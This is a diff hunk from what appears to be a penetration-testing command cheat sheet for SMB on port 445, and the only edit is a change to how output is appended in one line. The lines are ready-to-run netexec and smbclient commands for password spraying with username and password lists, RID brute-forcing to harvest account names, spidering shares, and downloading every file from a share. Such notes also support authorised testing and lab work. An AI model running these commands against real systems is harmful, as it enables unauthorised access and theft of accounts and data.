@@ -532,7 +532,7 @@ godap $TARGET -u '$USERNAME' -p '$PASSWORD' -d '$DOM'
 [*] (445) SMB
 nxc smb "$TARGET" -u usernames -p passwords --continue-on-success
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
-nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' | tee -a usernames; sort -u usernames | tee usernames; nxc smb "$TARGET" -u usernames -p passwords --continue-on-success
+nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' >> usernames; sort -u usernames | tee usernames; nxc smb "$TARGET" -u usernames -p passwords --continue-on-success
 
 NXCSPIDER=$(nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' -M spider_plus | grep -oP '(?<=Saved share-file metadata to ")[^"]+');cat $NXCSPIDER | grep -vE 'epoch|size' | sed -E 's/[{}\",:]//g' | sed '/^        $/d'
 mkdir smb; smbclient //$TARGET/SHARE -N -D . -c 'lcd smb; recurse; prompt; mget *'
